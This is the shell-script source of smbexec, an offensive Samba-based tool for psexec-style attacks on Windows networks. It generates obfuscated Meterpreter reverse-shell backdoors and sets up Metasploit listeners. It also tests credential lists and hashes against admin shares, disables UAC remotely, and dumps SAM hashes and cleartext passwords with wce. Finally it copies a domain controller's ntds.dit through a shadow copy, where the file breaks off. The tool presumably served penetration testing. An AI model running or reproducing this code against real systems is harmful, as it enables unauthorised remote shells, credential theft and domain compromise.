#!/bin/bash

# Written because we got sick of Metasploit PSExec getting popped
# Special thanks to Carnal0wnage who's blog inspired us to go this route
# http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html
#
# Script super-dopified by @al14s - Thanks for taking it to the next level!!
#
#Rapid psexec style attack using linux samba tools
#
#Copyright (C) 2013 Eric Milam (Brav0Hax) & Martin Bos (Purehate)
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.e
#
#############################################################################################

version="1.2.6"
codename="Mommy's Little Monster"

# Check to see if X is running
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	isxrunning=
else
	isxrunning=1
fi

# Uncomment the following line to launch Metasploit in a screen session instead of an xterm window.
#unset isxrunning

# Uncomment the following line to launch Metasploit in an xterm window if you've tunneled X over SSH.
#isxrunning=1

trap f_ragequit 2

# Find the files and set the path values based on machine architecture
smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')

if [ ! -e $smbexecpath/smbexeclient ] || [ ! -e $smbexecpath/smbwinexe ]; then
	echo -e "\n\e[1;31m[!] You have to compile the executables first.\e[0m\n\e[1;33m[*] Please run the installer and select option #4.\e[0m\n" 1>&2
	exit 1
fi

logfldr=$PWD/$(date +%F-%H%M)-smbexec
mkdir $logfldr

if [ -z $isxrunning ]; then
	echo -e "\n\e[1;31m[-] X Windows not detected, your Metasploit session will be launched in screen\e[0m\n"
	sleep 5
fi

# Workaround to get rid of annoying samba error for patched smbclient
if [ ! -e /usr/local/samba/lib/smb.conf ]; then
	mkdir -p /usr/local/samba/lib/
	cp $smbexecpath/patches/smb.conf /usr/local/samba/lib/smb.conf
fi

# See if wce exists in the progs folder
if [ -e $smbexecpath/wce-32.exe ] && [ -e $smbexecpath/wce-64.exe ]; then wce=1; fi

f_ragequit(){ 
echo -e "\n\n\e[1;31m[-] Rage-quitting....\e[0m"
sleep 3
#check if we've got shells in play... if so, we clean those up first...
if [[ $dirty == 1 ]];then
	echo -e "\n\e[1;31m[!] We have shells in play we need to cleanup those systems....\e[0m"
	sleep 2
	f_cleanup
fi

if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
rm -rf /tmp/smbexec/
clear
f_freshstart
f_mainmenu

}

f_vanish(){
	clear
	f_banner

	echo -e "\e[1;33mLet's get your payload setup...\e[0m\n"

	#"************************************************************"
	#"    Fully Undetectable Metasploit Payload generaor Beta     "
	#"        Original Concept and Script by Astr0baby            "
	#"     Stable Version of Script is Edited by Vanish3r         "
	#"    Video Tutorial by Vanish3r - www.securitylabs.in        "
	#" Powered by TheHackerNews.com and securitylabs.in           "
	#"************************************************************"
	# Major script modifications by Brav0Hax and al14s

	f_revhttp(){ 
		payload=windows/meterpreter/reverse_http
		f_setup_payload 
	}

	f_revhttps(){ 
		payload=windows/meterpreter/reverse_https
		f_setup_payload 
	}

	f_revtcp(){ 
		payload=windows/meterpreter/reverse_tcp
		f_setup_payload 
	}

	f_revtcpdns(){ 
		payload=windows/meterpreter/reverse_tcp_dns
		f_setup_payload 
	}

	f_custompayload(){
		clear
		f_banner
		while [ -z $payload ]; do
			read -p " Please enter your Windows payload (double-tab to list PWD) : " payload
		done
		f_setup_payload
	}


	f_setup_payload(){
		clear
		f_banner
		lhost=

		echo -e "\n\e[1;33mYou have chosen the following payload - $payload\e[0m"

		# Gather info to build standard payload		
		if [[ "$paychoice" == "4" ]]; then
			while [ -z $lhost ]; do read -p " Enter DNS Host Name ex: www.attacker.com : " lhost; done
		else
				
		#List interfaces w/ their IPs		
			echo -e "\nActive Interfaces:\n"
			ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'
			while [ -z $lhost ]; do read -p " Enter Local Host (LHOST) IP address : " lhost
			    if [[ ! $lhost =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
			        lhost=
			    fi
			done
		fi
		while [ -z $port ]; do read -p " What Port Number (LPORT) are we gonna listen to? : " port; done

		f_build_payload
	}

	f_build_payload(){
		#Find proper mingw32 to compile the binary
		mingw=$(find /usr/bin |grep mingw32|grep gcc$|grep -E -v 'amd64|x86_64')
		
		echo -e "\n\e[1;33mBuilding your payload please be patient...\e[0m"

		# Create backdoor.exe - puts the file together in order -al14s
		p=
		enumber=$((RANDOM%15+3))
		seed=$((RANDOM%10000+1))
		if [[ "$paychoice" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
		echo -e '#include <stdio.h>\nunsigned char ufs[]=' > $logfldr/backdoor.c
		for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> $logfldr/backdoor.c
		msfpayload "$payload" LHOST="$lhost" LPORT="$port"$p EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $enumber -t raw | msfencode -e x86/jmp_call_additive -c $enumber -t raw | msfencode -e x86/call4_dword_xor -c $enumber -t raw | msfencode -e x86/shikata_ga_nai -c $enumber | sed -e 's/+/ /g' | sed -e 's/buf = /unsigned char micro[]=/g' | sed '$a;' >> $logfldr/backdoor.c
		echo -e "int main(void) { ((void (*)())micro)();}\nunsigned char tap[]=" >> $logfldr/backdoor.c
		for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> $logfldr/backdoor.c
		echo -e "\n\e[1;33mCompiling executable...\e[0m"
		$mingw -Wall $logfldr/backdoor.c -o $logfldr/backdoor.exe > /dev/null 2>&1
		rm $logfldr/backdoor.c

		echo -e "\n\e[1;33mGetting file's SHA1SUM...\e[0m"
		sha1sum $logfldr/backdoor.exe > $logfldr/sha1-backdoor.hash
		strip --strip-debug $logfldr/backdoor.exe

		echo -e "\n\e[1;33mPayload successfully compiled and ready for use...\e[0m"

		f_resource_file
	}

	f_resource_file(){
		rc=$logfldr/metasetup.rc
		echo "spool $logfldr/msfoutput-$DATE.txt" > $rc
		echo "use exploit/multi/handler" >> $rc
		echo "set payload $payload" >> $rc
		echo "set LHOST $lhost" >> $rc
		echo "set LPORT $port" >> $rc
		if [ "$paychoice" -le "2" ]; then
			echo "set SessionCommunicationTimeout 600" >> $rc
		fi
		echo "set ExitOnSession false" >> $rc
		echo "set InitialAutoRunScript migrate -f" >> $rc
		echo "exploit -j -z" >> $rc
		if [ "$sysexpchoice" == "2" ]; then
			echo -e "\n\e[1;33mPayload and Resource file successfully created...\e[0m"
			sleep 3
			f_mainmenu
		else
			echo -e "\n\e[1;33mResource file successfully created, launching Metasploit...\e[0m"

			if [ -z $isxrunning ]; then
				echo -e "\n\e[1;33mLaunching Metasploit in a screen session, once its loaded hit Ctrl-a then a and then d to detach and continue attack setup\e[0m"
				echo -e "\n\e[1;33mPlease press enter to continue.\e[0m"
				read -p " "
				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r $rc"
			else
				xterm -geometry -0+0 -hold -e msfconsole -r $rc &
				sleep 10
			fi
		fi
	}

	# Function for supplying your own payload & rc file
	f_payloadrc(){
		valid=
		while [[ $valid != 1 ]]; do
            echo -ne "\n Please provide the full path to your payload file (ex: /root/Desktop/backdoor.exe) (double-tab to see PWD) : "
			read -e -p " " LPATH
			if [ -e $LPATH ]; then
				valid=1
			else
				echo "Not a valid file/path."
			fi
		done

		read -p " Do you have a Metasploit listener running already? [y/N] : " listener
		listener=$(echo ${listener} | tr 'A-Z' 'a-z')

		if [ "$listener" = "n" ] || [ -z "$listener" ]; then
			valid=
			while [[ $valid != 1 ]]; do
				echo -ne "\n Please provide the full path to your Metasploit rc file (ex: /root/Desktop/metasploit.rc) (double-tab to see PWD) :"
				read -e -p " " rcpath
				if [ -e $rcpath ] && [[ $(echo "$rcpath" | awk '{ print substr( $0, length($0)-1, length($0) ) }') == "rc" ]]; then
					valid=1
				else
					echo "Not a valid .rc file/path."
				fi
			done
			if [ ! -z $isxrunning ]; then
				xterm -geometry -0+0 -hold -e msfconsole -r $rcpath & > /dev/null 2>&1
				sleep 10
			elif [ -z $isxrunning ]; then
				echo -e "\n\e[1;33mLaunching Metasploit in a screen session, once its loaded hit Ctrl-a then d to detach and continue attack setup\e[0m"
				echo -en "\n\e[1;33mPlease press enter to continue...\e[0m"
				read -p " "
				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r $rcpath"
			fi
		fi
	}

	#Menu Items
	echo "Select Payload"
	echo "  1. windows/meterpreter/reverse_http"
	echo "  2. windows/meterpreter/reverse_https"
	echo "  3. windows/meterpreter/reverse_tcp"
	echo "  4. windows/meterpreter/reverse_tcp_dns"
	echo "  5. Other Windows Payload"
	echo "  6. I already have a payload and Metasploit rc file"
	echo "  7. Back (Main Menu)"

	echo -en "\n Choice :"
	read -p " " paychoice

	case "$paychoice" in
		1) f_revhttp ;;
		2) f_revhttps ;;
		3) f_revtcp ;;
		4) f_revtcpdns ;;
		5) f_custompayload ;;
		6) f_payloadrc ;;
		7) f_mainmenu ;;
		*) f_vanish ;;
	esac

	f_getinfo
}


f_banner(){
	clear
	echo "************************************************************"
	echo -e "		      \e[1;36msmbexec - v$version\e[0m       "
	echo "	A rapid psexec style attack with samba tools              "
	echo "      Original Concept and Script by Brav0Hax & Purehate    "
	echo "              Codename - $codename	          "
	echo -e "             Gonna pha-q up - \e[1;35mPurpleTeam\e[0m \e[1;37mSmash!\e[0m"
	echo "************************************************************"
	echo
}


#Function to verify logins can actually login into systems via C$
#Metasploit smb_login only verifies login is valid (IPC$) not if they can login to systems remotely as admin
f_smb_login(){
f_banner	
f_get_user_list
f_parse_user_list
f_get_target_list
f_verify_credentials
sleep 5
f_freshstart
f_mainmenu
}

f_get_user_list(){
user_list=
if [[ -e "$logfldr/hashes/DC/cred.lst" ]]; then p="[$logfldr/hashes/DC/cred.lst]"; fi
read -e -p " Please provide the path to your credential list $p: " user_list
if [ -z $user_list ]; then user_list="$logfldr/hashes/DC/cred.lst"; fi
if [ ! -e $user_list ]; then echo "The file provided does not exist..."; f_get_user_list; fi
p=
}

f_parse_user_list(){
#Credential file should be TAB separate. Below TABs are converted to '%' which is what smbclient needs as a separator
		sed -e 's:\t:%:g' $user_list > /tmp/smbexec/credentials.lst
}

f_get_target_list(){

    if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
    read -e -p " Target IP or host list $p: " tf
    if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

    if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	    echo $tf > /tmp/smbexec/rhost.txt
	    RHOSTS=/tmp/smbexec/rhost.txt
    elif [[ -e $tf ]]; then 
	    RHOSTS=$tf
    else
	    echo -en "   Invalid IP or file does not exist.\n"
	    sleep 3
	    f_get_target_list
    fi	
	read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
	if [ -z $SMBDomain ]; then SMBDomain=.;	fi
}

f_verify_credentials(){
SMBHASH=
password_hash=
	
	if [ -z "$check_for_da" ]; then
		read -p " Do you want to include a check for DA/EA processes on the systems? [y/N] : " da_check
		da_check=$(echo ${da_check} | tr 'A-Z' 'a-z')
		if [ "$da_check" = "y" ]; then check_for_da=1; fi
		echo
	fi
	
	for i in $(cat $RHOSTS); do
	# Check to see if login is valid
		for j in $(cat /tmp/smbexec/credentials.lst); do
			unset SMBHASH
			password_hash=$(echo $j|cut -d "%" -f2-)
			if [ "$(echo $password_hash| wc -m)" -ge "65" ]; then
				export SMBHASH=$password_hash # This is required when using a hash value
			fi
			$smbexecpath/smbexeclient //$i/C$ -U $SMBDomain/$j -c showconnect &> /tmp/smbexec/credential.chk
			f_successful_login
		done
	if [ -e /tmp/smbexec/$i.successful.logins.tmp ]; then
		cat /tmp/smbexec/$i.successful.logins.tmp| cut -d " " -f9-10 > $logfldr/$i.successful.logins
	fi
	
	if [ -e /tmp/smbexec/da-systems.lst ]; then
		cat /tmp/smbexec/da-systems.lst|cut -d " " -f2-13 > $logfldr/systems-with-da.lst
	fi
	done

}

f_successful_login(){

username=$(echo $j|cut -d "%" -f1|tr '[:upper:]' '[:lower:]')
password=$(echo $j|cut -d "%" -f2-)
successful_login=$(cat /tmp/smbexec/credential.chk|grep "//$i")

if [ -z "$successful_login" ]; then
	if [ $sysenumchoice != "4" ]; then echo -e "\e[1;31m[-] Remote login failed to $i with credentials $username $password\e[0m"; fi
else
	if [ $sysenumchoice != "4" ]; then echo -e "\e[1;32m[+] Remote login successful to $i with credentials $username $password \e[0m" | tee -a /tmp/smbexec/$i.successful.logins.tmp; fi
	if [ ! -z $check_for_da ]; then
		f_get_domain_admin_users
		f_get_logged_in_users
		f_compare_accounts
	fi
fi

}

f_get_domain_admin_users(){
if [ ! -e /tmp/smbexec/admins.tmp ]; then
	$smbexecpath/smbwinexe -U $SMBDomain/$j //$i "CMD /C net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain" &> /tmp/smbexec/admins.tmp
	cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|tr '[:upper:]' '[:lower:]'|sort -u> /tmp/smbexec/admins.lst
fi
}

f_get_logged_in_users(){
$smbexecpath/smbwinexe -U $SMBDomain/$j //$i "CMD /C tasklist /V /FO CSV" &> /tmp/smbexec/tasklist.tmp

#win2k doesn't have tasklist - this will hopefully prevent error spewing
f_tasklist_check

if [ -z "$tasklist_check" ]; then
	cat /tmp/smbexec/tasklist.tmp |cut -d '"' -f14|egrep -v '(NT AUTHORITY|User Name|HASH PASS|ERRDOS)'|cut -d "\\" -f2|tr '[:upper:]' '[:lower:]'|sort -u > /tmp/smbexec/tasklist.sorted

	$smbexecpath/smbwinexe --uninstall -U $SMBDomain/$j //$i "CMD /C qwinsta" &> /tmp/smbexec/qwinsta.tmp
	cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|cut -d "," -f3|egrep -v '(USERNAME|65536|HASH PASS|ERRDOS)'|tr '[:upper:]' '[:lower:]' > /tmp/smbexec/qwinsta.sorted
	sort -u /tmp/smbexec/tasklist.sorted /tmp/smbexec/qwinsta.sorted > /tmp/smbexec/loggedin.users
else
	echo -e "\e[1;31m[-] Looks like tasklist isn't available for the system, it may be Win2K.\e[0m"
fi
}

f_tasklisk_check(){
tasklist_check=$(cat /tmp/smbexec/tasklist.tmp|grep -o tasklist)
}

f_compare_accounts(){
unset admins
unset users

if [ -z "$tasklist_check" ]; then
	for admins in $(cat /tmp/smbexec/admins.lst); do
        	for users in $(cat /tmp/smbexec/loggedin.users|grep "$admins");do
        	        if [ ! -z "$users" ]; then 
        	                echo -e "\t\e[1;32m[+] DA account $users is logged in or running a process on $i \e[0m"|tee -a /tmp/smbexec/da-systems.lst
        	        fi
        	done
	done
else
	echo -e "\t\e[1;33m[!] Couldn't get logged in users to check for DA/EA.\e[0m"
fi

}

f_da_sys_check(){
check_for_da=1
f_smb_login
}

f_uac_setup(){
f_banner	

p=
if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then
	p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"
fi

read -e -p " Target IP or host list $p: " tf
if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	    echo $tf > /tmp/smbexec/rhost.txt
	    RHOSTS=/tmp/smbexec/rhost.txt
    elif [[ -e $tf ]]; then 
	    RHOSTS=$tf
    else
	    echo -en "   Invalid IP or file does not exist.\n"
	    sleep 3
	    f_uac_setup
fi

f_smbauth

for i in $(cat $RHOSTS); do
	#Check proper auth to system first, if no auth...no reason to continue....
	$smbexecpath/smbexeclient //$i/C$ -A /tmp/smbexec/smbexec.auth -c showconnect >& /tmp/smbexec/connects.tmp 

	f_smbauthinfo
	if [ "$sysenumchoice" == "5" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ];then
		f_uac_check
	elif [ "$sysexpchoice" == "3" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
		f_disable_uac
	elif [ "$sysexpchoice" == "4" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
		f_enable_uac
	else
		f_smbauthresponse
		sleep 2
	fi
	
	#Have to unset these because we're in a for loop
	unset logonfail
	unset connrefused
	unset badshare
	unset unreachable
done

if [ -e /tmp/smbexec/uac_enabled.lst.tmp ];then
	mv /tmp/smbexec/uac_enabled.lst.tmp $logfldr/uac_enabled.lst.$DATE
fi

f_freshstart
f_mainmenu

}

f_uac_check(){
	# Check to see if UAC is enabled on the system
	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA" &> /tmp/smbexec/uac.check.tmp
	uac_enabled=$(cat /tmp/smbexec/uac.check.tmp | grep -o "0x1")
	if [ ! -z "$uac_enabled" ]; then
		echo -e "\n\e[1;33m[*] UAC is enabled on $i\e[0m"
		sleep 1
		echo $i >> /tmp/smbexec/uac_enabled.lst.tmp
	else
		echo -e "\n\e[1;33m[*] UAC does not appear to be enabled on $i\e[0m"
		sleep 1
	fi

}

f_disable_uac(){
	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" &> /tmp/smbexec/uac_disable.tmp
	disable_success=$(cat /tmp/smbexec/uac_disable.tmp | grep -o "successfully")
	if [ ! -z $disable_success ]; then
		echo -e "\n\e[1;32m[+] UAC has been disabled on $i.\e[0m"
		sleep 1
	else
		echo -e "\n\e[1;31m[-] Could not disable UAC on $i.\e[0m"
		sleep 1
	fi
}

f_enable_uac(){
	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f" &> /tmp/smbexec/uac_enable.tmp
	enable_success=$(cat /tmp/smbexec/uac_enable.tmp | grep -o "successfully")

	if [ ! -z $enable_success ]; then
		echo -e "\n\e[1;32m[+] UAC has been enabled on $i.\e[0m"
		sleep 1
	else
		echo -e "\n\e[1;31m[-] Could not enable UAC on $i.\e[0m"
		sleep 1
	fi

}

#Function to grab local hashes and domain cached creds
f_hashgrab(){
creddumpath=$(locate -l 1 -b "\pwdump.py" | sed 's,/*[^/]\+/*$,,')

if [ ! -e "$logfldr"/hashes ]; then
	mkdir $logfldr/hashes
fi

    f_banner
    f_smbauth	
    p=
    if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
    read -e -p " Target IP or host list $p: " tf
    if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

    if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	    echo $tf > /tmp/smbexec/rhost.txt
	    RHOSTS=/tmp/smbexec/rhost.txt
    elif [[ -e $tf ]]; then 
	    RHOSTS=$tf
    else
	    echo -en "   Invalid IP or file does not exist.\n"
	    sleep 3
	    f_hashgrab
    fi

for i in $(cat $RHOSTS); do
	# Check to see if login is valid to the system before it attempts anything else
	$smbexecpath/smbexeclient //$i/C$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp

	# Check to see what type of error we got so we can tell the user
	f_smbauthinfo
	f_smbauthresponse

	# Get successful IP addy for cleanup later
	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)

	# If no successful connection was made above this portion is skipped
	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
		echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file
		if [ ! -d $logfldr/hashes/$i ]; then mkdir $logfldr/hashes/$i; fi
		# Get the registry keys
		$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %TEMP%" &> /tmp/smbexec/tempdir.info
		temp_drive=$(cat /tmp/smbexec/tempdir.info| cut -d ":" -f1|tr -d '\r')
		temp_dir=$(cat /tmp/smbexec/tempdir.info| awk -F':' '{ print $2 }'|tr -d '\r')
		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %TEMP%\sam && reg.exe save HKLM\SYSTEM %TEMP%\sys && reg.exe save HKLM\SECURITY %TEMP%\sec" &> /dev/null
		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "get $temp_dir\\sam $logfldr/hashes/$i/sam" &> /dev/null
		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "get $temp_dir\\sec $logfldr/hashes/$i/sec" &> /dev/null
		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "get $temp_dir\\sys $logfldr/hashes/$i/sys" &> /dev/null
	
		#Get the hashes out of the reg keys
		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sys ]; then
			$creddumpath/pwdump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sam > $logfldr/hashes/$i/localhashes.lst
			if [ -e $logfldr/hashes/$i/sec ]; then
				$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > /tmp/smbexec/dcchashes.tmp
				cat /tmp/smbexec/dcchashes.tmp |grep -v "ERR:" > /tmp/smbexec/dcchashes.lst
				if [ -s $logfldr/hashes/$i/dcchashes.lst ];then mv /tmp/smbexec/dcchashes.lst $logfldr/hashes/$i/dcchashes.lst;fi
			fi
			echo -en "\t\e[1;32m[+] Hashes from $i have been dumped...\e[0m\n"
			sleep 2
		    else
			echo -en "\t\e[1;31m[!] Something happened and I couldn't get the registry keys from $i...\e[0m\n"
			sleep 2
		fi
		
		#Get the clear text passwords with protected wce
		if [ "$wce" == 1 ]; then
			$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %PROCESSOR_ARCHITECTURE%" &> /tmp/smbexec/sys_arch.txt
			sys_arch=$(cat /tmp/smbexec/sys_arch.txt|grep x86)
			if [ -z $sys_arch ]; then
				wce_exe=wce-64.exe
			else
				wce_exe=wce-32.exe
			fi
			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "put $smbexecpath/$wce_exe $temp_dir\\wce.exe" &> /dev/null
			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C %TEMP%\wce.exe -w" &> /tmp/smbexec/wce.tmp
			#Put the passwords in a text file in the logfolder
			cat /tmp/smbexec/wce.tmp|grep :|egrep -v '(non-printable|ERROR|HASH)' > /tmp/smbexec/cleartext.pwds
			#Move cleartext file if it's not empty
			if [ -s /tmp/smbexec/cleartext.pwds ];then mv /tmp/smbexec/cleartext.pwds $logfldr/hashes/$i/cleartext.pwds;fi
			#cleanup the host including wce.exe
			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys && DEL %TEMP%\wce.exe" &> /dev/null
		else
			#cleanup the host minus wce.exe
			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys" &> /dev/null
		fi
	fi

	#Unset the variables because we're in a for-loop
	unset logonfail
	unset connrefused
	unset badshare
	unset unreachable
done
sleep 3
f_freshstart
f_mainmenu

}

f_dchashgrab(){
if [ ! -e "$logfldr"/hashes ]; then
	mkdir $logfldr/hashes
fi

f_banner
f_smbauth
f_finddcs

tf=
while [ -z $tf ]; do
	read -e -p " Domain Controller IP address: " tf

	if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		echo $tf > /tmp/smbexec/rhost.txt
		RHOSTS=/tmp/smbexec/rhost.txt
	else
		echo -en "   Invalid IP address...\n"
		tf=
	fi
done
f_ntdspath
}

f_ntdspath(){

ntdsdrive=
read -e -p " Enter NTDS Drive [C:]: " ntdsdrive

if [ -z $ntdsdrive ]; then
	ntdsdrive="C:"
fi

ntdspath=
read -e -p " Enter NTDS Path [\\Windows\\NTDS]: " ntdspath
if [ -z $ntdspath ]; then
	ntdspath="\\Windows\\NTDS"
fi

ntdssuccess=
echo -e "\n\e[1;33m[*]Checking to see if the ntds.dit file exists in the provided path\e[0m"
$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $ntdsdrive$ntdspath\\ntds.dit ECHO Success" &> /tmp/smbexec/ntds.chk
ntdssuccess=$(cat /tmp/smbexec/ntds.chk|grep -o Success)

if [ -z $ntdssuccess ]; then
	echo -e "\e[1;31m[-] The ntds.dit file does not exist in the path provided.\e[0m\n"
	sleep 3
	f_dchashgrab
else
	echo -e "\t\e[1;32m[+] The ntds.dit file was found in the path provided...\e[0m\n"
	sleep 3
	f_savepath
fi

}

f_savepath(){

tempdrive=
read -e -p " Enter the Drive to save the Shadow Copy and SYS key [C:]: " tempdrive

if [ -z $tempdrive ]; then
	tempdrive="C:"
fi

temppath=
read -e -p " Enter the Path to save the Shadow Copy and SYS key [\\Windows\\TEMP]: " temppath
if [ -z $temppath ]; then
	temppath="\\Windows\\TEMP"
fi

tempsuccess=
echo -e "\n\e[1;33m[*]Checking to see if the provided path exists\e[0m"
$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $tempdrive$temppath ECHO Success" &> /tmp/smbexec/temppath.chk
pathsuccess=$(cat /tmp/smbexec/temppath.chk|grep -o Success)

if [ -z $pathsuccess ]; then
	echo -e "\t\e[1;31m[-] The path provided does not exist...\e[0m\n"
	sleep 5
	f_savepath
else
	echo -e "\t\e[1;32m[+] The path provided exists...\e[0m\n"
fi

echo -e "\e[1;33m[*]We have to make sure there is enough disk space available before we do the Shadow Copy\e[0m"
$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C dir $ntdsdrive$ntdspath\\ntds.dit" &> /tmp/smbexec/ntds.size
disksize=$(cat /tmp/smbexec/ntds.size |grep free|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed -e 's/,//g')
filesize=$(cat /tmp/smbexec/ntds.size |grep File|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed 's/,//g')

if [ "$filesize" -gt "$disksize" ]; then
	echo -e "\e[1;31m[-] Not enough diskspace available to save the ntds.dit file...\e[0m"
	sleep 5
	f_mainmenu
else
	echo -e "\t\e[1;32m[+] Plenty of diskspace...\e[0m"
	f_createvss
fi
}

f_createvss(){
for i in $(cat $RHOSTS); do
	if [ ! -d $logfldr/hashes/DC ]; then
		mkdir -p $logfldr/hashes/DC
	fi
	# Create a Volume Shadow Copy
	echo -e "\n\e[1;33m[*]Attempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin create shadow /for=$ntdsdrive" &> /tmp/smbexec/vssdc.out
	vscpath=$(cat /tmp/smbexec/vssdc.out | grep "Volume Name"|cut -d " " -f9)
	vscid=\{$(cat /tmp/smbexec/vssdc.out |grep "Shadow Copy ID"|cut -d "{" -f2|cut -d "}" -f1)\}
	if [ -z "$vscpath" ]; then
		echo -e "\t\e[1;31m[!] Could not create a Volume Shadow Copy...\e[0m"
		cat /tmp/smbexec/vssdc.out
		sleep 5
		f_freshstart
		f_mainmenu
	else
		echo -e "\t\e[1;32m[+] Volume Shadow Copy Successfully Created...\e[0m"
		sleep 2
	fi
	
	echo -e "\n\e[1;33m[*]Attempting to copy the ntds.dit file from the Volume Shadow Copy...\e[0m"
	sleep 2
	sharedrive="$(echo $tempdrive| cut -d":" -f1)$"
	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C copy $vscpath\\$ntdspath\\ntds.dit $tempdrive$temppath\\ntds.dit && reg.exe save HKLM\SYSTEM $tempdrive$temppath\\sys" &> /dev/null
